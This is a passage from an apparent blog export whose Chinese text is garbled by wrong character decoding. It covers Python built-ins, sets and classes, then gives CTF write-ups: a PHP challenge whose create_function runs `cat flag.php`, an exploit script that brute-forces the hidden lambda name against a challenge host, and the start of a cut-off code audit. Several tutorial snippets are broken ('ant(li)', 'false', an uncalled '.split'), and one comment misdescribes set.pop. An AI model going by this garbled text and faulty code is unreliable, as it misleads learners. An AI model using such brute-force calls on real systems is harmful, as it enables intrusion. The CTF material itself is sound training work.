()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#Trur</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#False</span></span><br><span class="line">tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(tup)) <span class="comment">#False</span></span><br></pre></td></tr></table></figure>

<p><code>any()</code>æˆ–çš„å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨äºåˆ¤æ–­ç»™å®šçš„å¯è¿­ä»£å‚æ•°iterableæ˜¯å¦å…¨éƒ¨ä¸ºFalseï¼Œåˆ™è¿”å›Falseï¼Œå¦‚æœæœ‰ä¸€ä¸ªTrueï¼Œåˆ™è¿”å›True</span></span><br><span class="line"><span class="comment">#å‡½æ•°ç­‰ä»·äº</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">any</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¾‹å­</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">0</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(ant(li)) <span class="comment">#False</span></span><br><span class="line">li = [<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,false]</span><br></pre></td></tr></table></figure>

<p><code>sorted()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œ(list str tuple dict)</span></span><br><span class="line"><span class="comment">#å’ŒsortåŒºåˆ«ï¼š</span></span><br><span class="line"><span class="comment">#sortæ˜¯åº”ç”¨å†listä¸Šçš„æ–¹æ³•ï¼Œsortedå¯ä»¥å¯¹æ‰€æœ‰å¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œ</span></span><br><span class="line"><span class="comment">#listçš„sortæ–¹æ³•è¿”å›çš„æ˜¯å¯¹å·²ç»å­˜åœ¨çš„åˆ—è¡¨è¿›è¡Œæ“ä½œï¼Œ</span></span><br><span class="line">  <span class="comment">#è€Œå†…å»ºå‡½æ•°sortedæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„listï¼Œè€Œä¸æ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸Šè¿›è¡Œçš„</span></span><br><span class="line"><span class="comment">#è¯­æ³•ï¼š</span></span><br><span class="line"><span class="comment"># sorted(iterable[,cmp[,key[,reverse]]])</span></span><br><span class="line"><span class="comment">#å‚æ•°ï¼š</span></span><br><span class="line"><span class="comment">#cmp æ¯”è¾ƒå‡½æ•°ï¼Œè¿™ä¸ªå…·æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‚æ•°çš„å€¼éƒ½æ˜¯ä»å¯è¿­ä»£å¯¹è±¡ä¸­å–å‡ºï¼Œæ­¤å‡½æ•°å¿…é¡»éµå®ˆçš„è§„åˆ™ä¸ºï¼Œå¤§äºåˆ™è¿”å›1ï¼Œå°äºåˆ™è¿”å›-1ï¼Œç­‰äºåˆ™è¿”å›0</span></span><br><span class="line"><span class="comment">#key ä¸»è¦æ˜¯ç”¨æ¥è¿›è¡Œæ¯”è¾ƒçš„å…ƒç´ ï¼Œåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå…·ä½“çš„å‡½æ•°çš„å‚æ•°å°±æ˜¯å–è‡ªäºå¯è¿­ä»£å¯¹è±¡ä¸­å»ï¼ŒæŒ‡å®šå¯è¿­ä»£å¯¹è±¡ä¸­çš„ä»¥æ¶æå…ƒç´ æ¥è¿›è¡Œæ’åº</span></span><br><span class="line"><span class="comment">#reverse æ’åºè§„åˆ™ï¼Œreverse = True é™åºï¼Œåä¹‹å‡åº</span></span><br><span class="line"><span class="comment">#è¿”å›é‡æ–°æ’åºçš„åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li))  <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">True</span>)) <span class="comment">#[8, 6, 5, 3, 2, 1]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">False</span>)) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line">li.sort()</span><br><span class="line"><span class="built_in">print</span>(li) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br></pre></td></tr></table></figure>

<p><code>reverse()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨äºåå‘åˆ—è¡¨ä¸­çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">li.reverse()</span><br><span class="line"><span class="built_in">print</span>(li)</span><br></pre></td></tr></table></figure>

<p><code>range()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ•´æ•°åˆ—è¡¨ï¼Œä¸€èˆ¬ç”¨åœ¨forå¾ªç¯ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">range</span>(start,stop[,step])</span><br></pre></td></tr></table></figure>

<p><code>zip()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨æ¥æ‰“åŒ…çš„</span></span><br><span class="line">a = <span class="built_in">zip</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))</span><br><span class="line"><span class="comment"># [(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;)]</span></span><br><span class="line"></span><br><span class="line">s1 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">s2 = [<span class="string">&#x27;ä½ &#x27;</span>,<span class="string">&#x27;æˆ‘&#x27;</span>,<span class="string">&#x27;ä»–&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(s1,s2)))</span><br><span class="line"><span class="comment"># [(&#x27;a&#x27;, &#x27;ä½ &#x27;), (&#x27;b&#x27;, &#x27;æˆ‘&#x27;), (&#x27;c&#x27;, &#x27;ä»–&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸åŒåºåˆ—ä¸­çš„æ•°æ®æ ¹æ®ç´¢å¼•ä¸€ä¸€å¯¹åº”ï¼Œå¹¶ç»„æˆå…ƒç»„ï¼Œå„ä¸ªå…ƒç»„åˆç»„æˆä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç»„å…ƒç´ çš„ä¸ªæ•°ç”±æœ€çŸ­çš„åºåˆ—å†³å®š</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printBookInfo</span>():</span></span><br><span class="line">    books = [] </span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å›¾ä¹¦ç¼–å·: &quot;</span>).split</span><br><span class="line">    bookName = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä¹¦å:&quot;</span>)</span><br><span class="line">    bookPos = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ç½®:&quot;</span>)</span><br><span class="line">    idList = <span class="built_in">id</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookNameList = bookName.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    posList = bookPos.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookInfo = <span class="built_in">zip</span>(idList, bookNameList, posList)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bookInfo:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        éå†å›¾ä¹¦ä¿¡æ¯ï¼Œè¿›è¡Œå­˜å‚¨</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dictInfo = &#123;<span class="string">&#x27;ç¼–å·&#x27;</span>:item[<span class="number">0</span>],<span class="string">&#x27;ä¹¦å&#x27;</span>:item[<span class="number">1</span>],<span class="string">&#x27;ä½ç½®&#x27;</span>:item[<span class="number">2</span>]&#125;</span><br><span class="line">        books.append(dictInfo)</span><br><span class="line">        <span class="comment">#å°†å­—å…¸å¯¹è±¡æ·»åŠ åˆ°listå®¹å™¨ä¸­</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> books:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">printBookInfo()</span><br></pre></td></tr></table></figure>

<p><code>enumerate()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨äºå°†ä¸€ä¸ªå¯éå†çš„æ•°æ®å¯¹è±¡ç»„åˆä¸ºä¸€ä¸ªç´¢å¼•åºåˆ—ï¼ŒåŒæ—¶åˆ—å‡ºæ•°æ®å’Œæ•°æ®ä¸‹æ ‡ï¼Œä¸€èˆ¬ç”¨åœ¨forå¾ªç¯ä¸­</span></span><br><span class="line"><span class="comment"># enumerate(sequence,[start=0])</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(li, start=<span class="number">0</span>):</span><br><span class="line">     <span class="built_in">print</span>(i) <span class="comment">#ç´¢å¼•åŠ å…ƒç´ çš„å…ƒç»„ç±»å‹</span></span><br><span class="line"> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(li):</span><br><span class="line">       <span class="built_in">print</span>(i, j) <span class="comment">#åˆ†åˆ«è¾“å‡ºå¯¹åº”çš„å€¼</span></span><br><span class="line">dictA = &#123;&#125;</span><br><span class="line">dictA[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">dictA[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;female&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment">#ç´¢å¼•åŠ é”®çš„å…ƒç»„ç±»å‹</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="comment">#éå†å­—å…¸</span></span><br><span class="line">    <span class="built_in">print</span>(i, j, dictA[j])</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-ä¸‰å…ƒè¿ç®—"><a href="#0x04-ä¸‰å…ƒè¿ç®—" class="headerlink" title="0x04:ä¸‰å…ƒè¿ç®—"></a>0x04:ä¸‰å…ƒè¿ç®—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = å€¼1 if æ¡ä»¶ else å€¼2</span><br></pre></td></tr></table></figure>

<h5 id="0x05-seté›†åˆ"><a href="#0x05-seté›†åˆ" class="headerlink" title="0x05:seté›†åˆ"></a>0x05:seté›†åˆ</h5><p>setï¼ˆé›†åˆï¼‰æ˜¯pythonä¸­çš„ä¸€ç§æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªæ— åºä¸”ä¸é‡å¤çš„å…ƒç´ é›†åˆ</p>
<p>ç‰¹ç‚¹ï¼š</p>
<p>ä¸æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡ï¼Œæ˜¯ä¸€ä¸ªæ— åºçš„ä¸”ä¸é‡å¤çš„å®¹å™¨ï¼Œç±»ä¼¼äºå­—å…¸ï¼Œä½†æ˜¯åªæœ‰keyæ²¡æœ‰value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºé›†åˆæ–¹å¼ï¼š</span></span><br><span class="line"></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">se2 = <span class="built_in">set</span>(list1)</span><br></pre></td></tr></table></figure>

<p><code>é›†åˆæ“ä½œå‡½æ•°</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add()</span></span><br><span class="line">set1 = <span class="built_in">set</span>()</span><br><span class="line">set1.add(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() æ¸…ç©º</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.clear()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference()  å·®é›† set1ä¸­å­˜åœ¨ï¼Œset2ä¸­ä¸å­˜åœ¨</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection() äº¤é›†</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.intersection(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># union()  å¹¶é›†</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.union(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() ç§»é™¤æ•°æ® ä»é›†åˆä¸­æ‹¿æ•°æ®å¹¶åˆ é™¤</span></span><br><span class="line"><span class="comment"># ç§»é™¤æœ€å°çš„æ•°æ®å¹¶å°†å‰©ä¸‹çš„æ•°æ®è¿›è¡Œå‡åºæ’åº</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.pop()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># discard()</span></span><br><span class="line"><span class="comment"># update() æ›´æ–°æ•°æ®</span></span><br></pre></td></tr></table></figure>

<h3 id="7-é¢å‘å¯¹è±¡"><a href="#7-é¢å‘å¯¹è±¡" class="headerlink" title="7.é¢å‘å¯¹è±¡"></a>7.é¢å‘å¯¹è±¡</h3><h5 id="0x01-ä»‹ç»"><a href="#0x01-ä»‹ç»" class="headerlink" title="0x01:ä»‹ç»"></a>0x01:ä»‹ç»</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼šå°†æ•°æ®å’Œå‡½æ•°ç»‘å®šï¼Œè¿›è¡Œå°è£…ï¼Œè¿™æ ·èƒ½å¤Ÿæ›´å¿«é€Ÿåœ°å¼€å‘ç¨‹åºï¼Œå‡å°‘é‡å¤ä»£ç çš„é‡å†™è¿‡ç¨‹ï¼ˆå…³æ³¨è®¾è®¡æ€ç»´</span><br><span class="line">â€”â€”â€”â€”é€‚åˆåšå¤§é¡¹ç›®</span><br></pre></td></tr></table></figure>

<p><code>ç±»å’Œå¯¹è±¡</code></p>
<p>å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹</p>
<h5 id="0x02-å®šä¹‰ç±»"><a href="#0x02-å®šä¹‰ç±»" class="headerlink" title="0x02:å®šä¹‰ç±»"></a>0x02:å®šä¹‰ç±»</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class Foo(object):</span></span><br><span class="line"><span class="comment">#    å±æ€§</span></span><br><span class="line"><span class="comment">#    æ–¹æ³•åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#    pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span> <span class="comment">#selfå…³é”®å­—</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åƒé¥­&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = Person() <span class="comment">#è¿›è¡Œå®ä¾‹åŒ–ï¼Œaä¸ºå¯¹è±¡</span></span><br><span class="line">a.eat() <span class="comment">#è°ƒç”¨æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•"><a href="#0x03-å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•" class="headerlink" title="0x03:å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•"></a>0x03:å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•</h5><p>å®ä¾‹æ–¹æ³•ï¼šåœ¨ç±»çš„å†…éƒ¨ï¼Œä½¿ç”¨defå…³é”®å­—å¯ä»¥å®šä¹‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œä¸ä¸€èˆ¬å‡½æ•°å®šä¹‰ä¸åŒï¼Œç±»æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•°<code>self</code>ï¼Œä¸”ä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>å±æ€§ï¼šåœ¨ç±»çš„å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆç±»å±æ€§</p>
<p>å®ä¾‹å±æ€§ï¼šå®šä¹‰åœ¨æ–¹æ³•é‡Œé¢ä½¿ç”¨selfå¼•ç”¨çš„å±æ€§ç§°ä¹‹ä¸ºå®ä¾‹å±æ€§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    native_place=<span class="string">&#x27;&#x27;</span> <span class="comment">#ç›´æ¥å†™åœ¨ç±»é‡Œé¢çš„å˜é‡ä¸ºç±»å±æ€§</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å®ä¾‹æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;eat action&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é™æ€æ–¹æ³•&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#ç±»æ–¹æ³•</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cm</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç±»æ–¹æ³•&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–æ–¹æ³• ï¼ˆæ„é€ æ–¹æ³•</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.name = <span class="string">&#x27;å°æ˜&#x27;</span> <span class="comment">#å®ä¾‹å±æ€§</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">p = Person()</span><br></pre></td></tr></table></figure>

<h5 id="0x04-é­”æœ¯æ–¹æ³•"><a href="#0x04-é­”æœ¯æ–¹æ³•" class="headerlink" title="0x04:é­”æœ¯æ–¹æ³•"></a>0x04:é­”æœ¯æ–¹æ³•</h5>]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>è¯­è¨€å­¦ä¹ </tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬ä¸€å‘¨å­¦ä¹ </title>
    <url>/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="SUCTF-annonymous"><a href="#SUCTF-annonymous" class="headerlink" title="[SUCTF]annonymous"></a>[SUCTF]annonymous</h4><ul>
<li>create_function</li>
</ul>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>0x01:å®¡è®¡</strong></p>
<p>é¦–å…ˆåˆ©ç”¨<code>creat_function</code>åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè€Œevalå‡½æ•°ä¸­ä¹Ÿå®ç°äº†å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨ï¼Œä½†æ˜¯evalä¸­åˆ›å»ºçš„å‡½æ•°åç”¨äº†<code>openssl_random_pseudo_bytes</code>å‡½æ•°ï¼Œæ‰€ä»¥å¾ˆéš¾è¿›è¡Œçˆ†ç ´</p>
<p>ä½†æ˜¯å¯ä»¥ä»åŒ¿åå‡½æ•°å…¥æ‰‹ï¼Œå› ä¸ºcreate_functionåˆ›å»ºåŒ¿åå‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°çš„åå­—ä¼šé»˜è®¤ä¸º<code>%00lambda_%d</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´åé¢çš„<code>%d</code>æ‰§è¡Œå¯¹åº”çš„åŒ¿åå‡½æ•°</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3f157adf-697c-4764-b2cc-994d24033869.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;$flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;go! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<span id="more"></span>

<h4 id="DDCTF-homebrew-event-loop"><a href="#DDCTF-homebrew-event-loop" class="headerlink" title="[DDCTF]homebrew event loop"></a>[DDCTF]homebrew event loop</h4><ul>
<li>pythonä»£ç å®¡è®¡</li>
</ul>
<p>æ‰“å¼€é¡µé¢ï¼Œå¯ä»¥å‘ç°urlä¸Šæœ‰ä¸åŒçš„åœ°æ–¹ï¼Œç„¶åè¿˜å‘Šè¯‰äº†æˆ‘ä»¬çš„ä¿¡æ¯ï¼šæœ‰å¤šå°‘é’»çŸ³å’Œåˆ†æ•°ï¼Œç„¶åå¯ä»¥åœ¨e-shopé‡Œé¢è´­ä¹°é’»çŸ³ï¼Œå¹¶ä¸”å¯ä»¥ç‚¹å‡»Resetè¿›è¡Œé‡ç½®</p>
<p><img src="https://img-blog.csdnimg.cn/62440506dff64e97b32dab7e58f41e3c.png" alt="img"></p>
<p>ä¹‹åç›´æ¥çœ‹æºç å§ï¼š</p>
<p><strong>0x01:å®¡è®¡+è§£é¢˜</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span> <span class="comment"># è·å–flag</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br></pre></td></tr></table></figure>

<p>  -<code>trigger_event</code>å‡½æ•°ç”¨äºå°†eventå…ƒç´ åŠ å…¥sessionçš„logå’Œæ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œå®ç°å¯¹å‡½æ•°çš„æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span>  </span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event) <span class="comment"># </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: <span class="comment"># å¦‚æœlogçš„é•¿åº¦å¤§äº5é‚£ä¹ˆåªæˆªå–æœ€åäº”ä½</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]): 